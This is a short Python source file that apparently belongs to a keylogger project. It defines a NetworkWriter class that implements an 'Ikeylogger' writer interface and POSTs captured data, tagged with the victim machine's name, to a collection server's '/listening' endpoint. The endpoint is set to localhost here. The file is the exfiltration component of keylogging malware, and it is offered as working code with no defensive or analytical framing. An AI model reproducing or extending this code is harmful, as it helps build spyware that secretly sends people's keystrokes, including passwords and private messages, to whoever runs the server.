import requests
from Ikeylogger import IWriter

class NetworkWriter(IWriter):
    def __init__(self):
        self.server_url = "http://localhost:5000/api"

    def send_data(self, data: str, machine_name: str) -> None:
        response = requests.post(
            f"{self.server_url}/listening/{machine_name}",
            json=data,
            headers={"Content-Type": "application/json"}
        )

networkWriter = NetworkWriter()